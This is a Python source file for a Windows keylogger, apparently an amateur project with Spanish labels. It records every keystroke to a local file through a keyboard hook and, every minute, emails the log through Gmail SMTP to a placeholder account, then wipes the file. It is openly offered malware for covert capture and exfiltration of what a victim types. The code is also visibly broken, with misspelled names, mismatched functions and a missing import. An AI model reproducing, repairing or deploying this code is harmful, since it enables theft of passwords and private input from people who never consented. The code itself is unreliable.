import keyboard , pythoncom , sys , logging
import time , datetime 
import smtplib
wait_seconds = 60
archivo_log = "C:\Users\PICHON\Downloads\Creacion del KEYLOGER\\datos.txt"
timeout = time.time()+wait_seconds

def timeOut():
    if time.time () > timeout:
        return True
    else:
        return False

def SendEmail(user,pwd, recipient,subject,body):
    import smtplib
    gmail_user =user
    gmail_pass =pwd
    fROM =user
    TO = recipient if type (recipient) is list else (recipient)
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ",".jion(TO), SUBJECT , TEXT )
    try:
        server=smtplib.SMTP("smtp.gmail.com", 587) 
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        server.sendmail (fROM, TO message)
        server.close()
        print("correo enviado corectamente")
    except:
        print("error al enviar el correo")

def FormatAndSendLogEmail():
    with open(archivo_log, "r+") as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H: %M: %S")
        data = f.read().replace("\n", "")
        SendEmail("tu correo@gmail.com", "tuclave","tu correo@gmail.com"
                  "nuevo log - "+actualdate, data)
        f.seek()
        f.truncate()

def OnKeyboardEvent(event):
    logging.basicConfig(filename=archivo_log, level=logging.DEBUG, 
                            format ="%(message)s")
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager = Keydow = OnKeyboardEvent()
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        TimeOut = time.time() + wait_seconds

    pythoncom.PumpWaitingMessages()